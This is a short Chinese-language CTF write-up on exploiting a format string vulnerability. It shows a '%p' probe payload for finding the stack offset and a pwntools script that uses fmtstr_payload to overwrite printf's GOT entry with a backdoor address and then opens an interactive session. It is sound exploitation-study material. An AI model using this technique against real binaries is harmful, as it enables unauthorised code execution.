首先，我们拿到我们的程序后
![[Pasted image 20240209145903.png]]

发现存在一个明显的格式化字符串漏洞，并且我们没有栈溢出，于是我们需要采用我们的格式化字符串修改 got 表来进行我们的操作。

我们对于格式化字符串修改 got 表有两种方法：
第一种：采用我们的 pwn 工具包中自带的工具：
**第一个参数为数据距离格式化字符串的偏移，这个我们可以通过暴力枚举计算，

```python
payload = 'aaaa-%p-%p-%p-%p'
```

![请添加图片描述](https://img-blog.csdnimg.cn/8a06c3fc15904450a63994e6499e48a6.png)


**第二个参数为字典{pirntf_got: addr}，攻击载荷 pwntools 已经为我们填好，可以直接使用**


```
from pwn import *
elf = ELF(program)
printf_got = elf.got["printf"]
backdoor = int(p.recv(9),16)
payload = fmtstr_payload(11,{printf_got:backdoor})
p.sendline(payload)
p.interactive()
```